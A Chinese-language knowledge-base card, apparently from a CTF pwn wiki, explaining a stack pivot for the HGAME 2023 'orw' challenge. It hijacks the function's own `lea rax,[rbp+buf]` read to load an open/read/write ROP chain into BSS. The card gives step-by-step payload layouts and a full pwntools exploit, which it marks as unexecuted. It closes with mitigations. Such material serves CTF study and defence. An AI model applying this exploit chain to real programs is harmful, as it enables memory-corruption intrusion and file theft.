---
id: binary-pwn-stack-lea-rax-rbp-buf-short-read-bss-migration-orw
title: 短读栈迁移：覆盖 saved rbp 后跳回函数内 lea rax,[rbp+buf]，借原 read 把二段 ORW 链读入 BSS 再 leave;ret 迁栈
type: scenario
domain: binary
path: binary/pwn/stack
technique: lea-rax-rbp-buf-short-read-bss-migration-orw
tags:
- pwn
- stack
- stack-pivot
- bss
- short-read
- orw
- seccomp
- rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V351
  verified_at: '2026-11-09T00:41:44+08:00'
  notes: 已对照原文 HGAME 2023 orw 段与图06-11核对：vuln buf[256]、read 0x130、余 0x28 字节，lea rax,[rbp+buf] 读封装（0x4012CF）、两次 leave;ret 迁 BSS 与原文 EXP 一致；图11 显示 RBP 被覆盖为 0x4047xx。CTF 题无版本，affected_versions 已 clear；PoC 未执行，PoC 中 libc.sym['pop_rsi'] 等 gadget 符号实际需按目标 libc 偏移重标定。
url: /docs/binary/pwn/stack/binary-pwn-stack-lea-rax-rbp-buf-short-read-bss-migration-orw/
draft: false
kb_aliases:
- lea rax,[rbp+buf] 迁移
- 短读 BSS 二次读入
- 函数自身 read 当读入 gadget
- saved rbp 覆盖迁栈
- seccomp ORW 栈迁移
- HGAME orw
---

## 一句话结论

当栈溢出足够覆盖 saved rbp 和返回地址、但剩余可写字节（如 0x28）不够放下完整 ORW 链时，可以把 saved rbp 改成 BSS 高地址、返回地址改回函数内 `lea rax, [rbp+buf]` 指令；函数随后以伪造的 rbp 计算 `rax = rbp - sizeof(buf)`，用它自己的 `read(0, rax, 大长度)` 把二段 ORW 链读进 BSS，最后 `leave; ret` 把栈迁到 BSS 上执行。

## 原理

- **短读的字节预算**：`read(0, buf, 0x130)` 之类的溢出读长度固定，覆盖 saved rbp + 返回地址需要 `buf_size + 8` 字节；余下空间（如 0x130-0x108=0x28）只够放一条 `pop rdi; GOT; puts@plt; main` 的 libc 泄露链，放不下 open/read/write 的完整 ROP。
- **把函数自身变成“读入 gadget”**：函数体内存在 `lea rax, [rbp+buf]; mov edx, <大长度>; mov rsi, rax; mov edi, 0; call read` 的读封装。若返回地址指向 `lea rax, [rbp+buf]` 这一条，而 saved rbp 已被覆盖为 `BSS_base`，则进入该指令时 `rbp = BSS_base`，`rax = BSS_base + buf_offset`（buf 相对 rbp 的负偏移），随后的 `read` 就把第二段数据写到 BSS 的预定位置，长度仍是函数原本的大长度。
- **leave;ret 完成迁移**：第二段读完后，函数的 `leave` 执行 `mov rsp, rbp; pop rbp`，`ret` 从 `[BSS_base+8]` 取出下一跳。由于第二段数据正是从 `BSS_base+ buf_offset` 开始写，攻击者在第二段末尾布置 `p64(BSS_base) + p64(leave)`：第一次 `leave;ret` 后 rbp 变成 BSS 上的指针、下一跳再次 `leave`，第二次 `leave` 把 rsp 切到第二段起始处，`ret` 进入紧跟在 `/flag\0` 之后的 ORW 链。
- **为什么需要两次 leave**：函数 epilogue 的 `leave` 会先把 rsp 设成被覆盖的 rbp（BSS 高地址）并弹出一个 rbp；要回到第二段数据的开头，需要再执行一条 `leave`，因此第二段末尾要放 `[BSS_base]` 与 `leave` 地址，形成“两次 leave 抬 0x08”的布局。
- **前提**：非 PIE 或已知 BSS 地址；函数内存在可重入的 `lea rax,[rbp+buf]` 读封装；第一次读长度足以泄露 libc 并覆盖 rbp/ret；目标开启 seccomp 只允许 open/read/write 等。

## 触发条件

- 目标为 x86-64 非 PIE（或已泄露 PIE 基址），BSS 地址已知且可写。
- 栈溢出距离返回地址为固定值，第一次 `read` 后剩余字节足以完成 libc 泄露并按 `saved rbp + ret` 布局。
- 二进制中存在“`lea rax, [rbp+负偏移]` → 作为 rsi → `call read`”的读封装，且该指令可作为 ret 目标到达。
- 目标开启 seccomp（通常只允许 open/read/write），无法直接 system。
- 第二次 `read` 的长度足够容纳 ORW 链，且 BSS 目标区域不与程序中其他关键数据冲突。

## 利用步骤

1. 反汇编栈溢出函数，确认 `buf` 相对 rbp 的偏移、`read` 长度、epilogue 为 `leave; ret`，并找到 `lea rax, [rbp+buf]` 的地址（记作 `lea_rax`）与 `leave` 地址。
2. 第一段：`b'a' * (offset_to_ret - 8) + p64(bss + 0x300 + 0x100) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`，泄露 libc 后回到 main；其中 saved rbp 被改为 `bss+0x400`。
3. 第二段（第一次重入）：`b'a' * (offset_to_ret - 8) + p64(bss + 0x400) + p64(lea_rax)`。程序进入 `lea rax,[rbp+buf]` 时 rbp=bss+0x400，rax=bss+0x300，`read(0, bss+0x300, 0x130)` 读入真正的 ORW 链。
4. 构造 ORW 链：`b'/flag\x00\x00\x00'` + `pop_rdi; bss+0x300; pop_rsi; 0; open` + `pop_rdi; 3; pop_rsi; bss+0x300; pop_rdx; 0x100; read` + `pop_rdi; 1; pop_rsi; bss+0x300; pop_rdx; 0x100; write`。
5. 链后 `ljust(0x100, b'\x00')`，再追加 `p64(bss+0x300) + p64(leave)`，使两次 `leave; ret` 后 rsp 落在 bss+0x308，进入 `pop_rdi` 开始的 ORW 链。
6. 发送第二段后接收 flag；必要时用 `pause()` 分两次发送，避免一次性写入被 read 拆分。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./vuln')
elf = ELF('./vuln'); libc = ELF('./libc-2.31.so')

offset = 0x100 + 0x08
pop_rdi = 0x401393
bss = 0x404300
lea_rax = 0x4012CF          # lea rax, [rbp+buf]; mov edx,0x130; ...; call read
leave = 0x4012EE
main_addr = 0x4012F0

# 1) 泄露 libc，回到 main
p.recvuntil(b'Maybe you can learn something about seccomp, before you try to solve this task.')
p.send(b'a' * offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main_addr))
puts_real = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc.address = puts_real - libc.sym['puts']

# 2) 覆盖 saved rbp，回到函数内 lea_rax，让原 read 把二段写入 bss+0x300
p.recvuntil(b'Maybe you can learn something about seccomp, before you try to solve this task.')
p.send(b'a' * (offset - 8) + p64(bss + 0x400) + p64(lea_rax))
pause()

# 3) 二段 ORW 链 + 两次 leave 的布局
payload  = b'/flag\x00\x00\x00' + p64(pop_rdi) + p64(bss + 0x300)
payload += p64(libc.sym['pop_rsi']) + p64(0) + p64(libc.sym['open'])
payload += p64(pop_rdi) + p64(3) + p64(libc.sym['pop_rsi']) + p64(bss + 0x300)
payload += p64(libc.sym['pop_rdx']) + p64(0x100) + p64(libc.sym['read'])
payload += p64(pop_rdi) + p64(1) + p64(libc.sym['pop_rsi']) + p64(bss + 0x300)
payload += p64(libc.sym['pop_rdx']) + p64(0x100) + p64(libc.sym['write'])
payload  = payload.ljust(0x100, b'\x00') + p64(bss + 0x300) + p64(leave)
p.send(payload)
p.interactive()
```

## 变体与关联

- **同族读封装**：只要函数内存在 `lea reg, [rbp+off]` 后把该寄存器交给 `read` 的序列，都可复用；若寄存器是 rdi 或其他参数寄存器，按调用约定调整后续布局。
- **无此 gadget 时**：直接用 `leave; ret` 把 rbp 迁到 BSS（[[binary-pwn-stack-pivot-leave-ret-bss]]），或用 `_start`/main 当可重复读入 gadget 分块写 ROP（[[binary-pwn-stack-bss-pivot-write-gadget-chunked-orw]]）。
- **有输出函数时**：可先在栈上直接泄露 libc 再迁移；无输出时可用 `_libc_start_main` 返回地址附近的 write gadget。
- **ORW 变体**：seccomp 禁用 open/read/write 时分别用 openat/sendfile/pread 等替代（[[binary-pwn-sandbox-escape-orw-missing-read-sendfile-preadv-mmap]]、[[binary-pwn-sandbox-escape-orw-missing-open-openat-retfq-i386-open]]）。
- **关联卡片**：[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]（伪造 rbp 过栈帧校验）、[[binary-pwn-stack-controlled-pointer-memcpy-environ-orw]]（environ 泄栈 + ORW）。

## 检测与防御

- **缓解**：开启 Canary（阻止 saved rbp/ret 覆盖）、PIE（BSS 地址随机化）、Full RELRO；seccomp 采用白名单（只放行真正需要的 syscall），而不是只禁 execve。
- **代码层**：读入长度严格等于缓冲区大小；避免在可被 ret 进入的函数里保留 `lea reg,[rbp+off] + read` 的可重用序列；用 `-fstack-protector-strong` 编译。
- **CTF 之外**：该手法本质是 ROP 栈迁移，检测上关注异常的 `read` 大长度写入全局区、以及从全局区发起的 ROP 链执行（非栈返回地址序列）。
